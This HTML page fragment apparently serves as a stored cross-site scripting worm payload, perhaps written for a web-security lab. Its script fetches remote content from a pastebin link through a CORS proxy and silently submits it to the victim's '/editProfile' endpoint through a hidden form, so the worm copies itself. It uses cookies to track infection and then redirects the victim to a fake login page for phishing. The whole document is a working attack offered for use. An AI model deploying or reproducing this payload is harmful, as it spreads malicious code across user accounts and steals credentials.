<h1 class="title">Já foste comido 😎</h1>
<img src="https://gifdb.com/images/high/matrix-background-hackerman-j47lwaq6pwv67oyg.gif">
<script>

if(get_cookie("phish")=="" && get_cookie("pwn")!=""){
  set_cookie("phish","true");
  window.location.replace("http://localhost:4000/login");
}

fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://pastebin.com/raw/TVMEEqPe')}`)
  .then(function(response) {
    response.text().then(function(data) {
      do_evil(data);
    });
  });

function do_evil(data){
  const obj = JSON.parse(data);
  var evil_data = obj.contents;

  var form = document.createElement("form");
  document.body.appendChild(form);
  form.method = "POST";
  form.id="evil";
  form.action = "/editProfile";

  
  var input = document.createElement("input");
  input.type="hidden";
  input.name="description";
  input.value=evil_data;
  form.appendChild(input);


  if(get_cookie("pwn")==""){
    set_cookie("pwn","true");
    var form = document.getElementById('evil');
    form.submit();
  }

}

function set_cookie(name, value) {
  document.cookie = name +'='+ value +'; Path=/;';
}
function delete_cookie(name) {
  document.cookie = name +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
}
function get_cookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
</script>